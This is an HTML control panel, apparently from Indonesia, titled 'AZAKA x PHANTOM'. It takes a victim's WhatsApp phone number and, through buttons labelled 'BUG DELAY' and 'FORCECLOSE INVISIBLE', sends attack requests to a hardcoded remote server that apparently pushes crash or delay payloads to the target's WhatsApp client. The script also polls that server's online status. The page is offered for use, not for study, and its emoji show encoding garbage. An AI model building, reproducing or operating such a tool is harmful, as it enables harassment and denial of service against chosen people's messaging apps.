<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>AZAKA x PHANTOM</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: sans-serif;
      background: #000 url('bg.jpg') no-repeat center center fixed;
      background-size: cover;
      color: white;
      text-align: center;
    }

    .container {
      margin-top: 100px;
      padding: 20px;
    }

    input[type="text"] {
      padding: 10px;
      width: 250px;
      border-radius: 8px;
      border: none;
      margin-bottom: 20px;
    }

    .btn {
      padding: 10px 20px;
      background-color: crimson;
      color: white;
      border: none;
      border-radius: 6px;
      margin: 5px;
      cursor: pointer;
      font-weight: bold;
    }

    .btn:hover {
      background-color: darkred;
    }

    #status {
      margin-top: 30px;
      font-weight: bold;
      color: yellow;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>AZAKA x PHANTOM</h1>

    <input type="text" id="target" placeholder="Masukkan nomor 62xxxxxxxxxxx" /><br>

    <button class="btn" onclick="sendAPI('delay')">BUG DELAY</button>
    <button class="btn" onclick="sendAPI('fcin')">FORCECLOSE INVISIBLE</button>

    <div id="status">‚è≥ Mengecek status server...</div>
  </div>

  <script>
    async function sendAPI(type) {
      const number = document.getElementById("target").value.trim();
      const status = document.getElementById("status");

      if (!number.startsWith("62") || number.length < 10) {
        alert("‚ùó Nomor harus valid dan dimulai dengan 62.");
        return;
      }

      const url = `https://46.101.32.52:2004/evolution?type=${type}&chatId=${number}@s.whatsapp.net`;
      console.log("üîó Mengirim ke:", url);

      try {
        const res = await fetch(url);
        const data = await res.text();
        console.log("‚úÖ Respon API:", data);
        status.innerText = `‚úÖ Berhasil dikirim: ${data}`;
        status.style.color = "lightgreen";
      } catch (err) {
        console.error("‚ùå Error:", err);
        status.innerText = "‚ùå Gagal mengirim. (Periksa koneksi atau izin CORS)";
        status.style.color = "red";
      }
    }

    async function cekStatus() {
      const status = document.getElementById("status");
      try {
        const res = await fetch("https://46.101.32.52:2004/status");
        const text = await res.text();
        if (text.trim() === "true") {
          status.innerText = "üü¢ STATUS: ONLINE";
          status.style.color = "lightgreen";
        } else {
          status.innerText = "üî¥ STATUS: OFFLINE";
          status.style.color = "red";
        }
      } catch {
        status.innerText = "‚ö†Ô∏è Tidak bisa menghubungi server";
        status.style.color = "orange";
      }
    }

    cekStatus();
  </script>
</body>
</html>
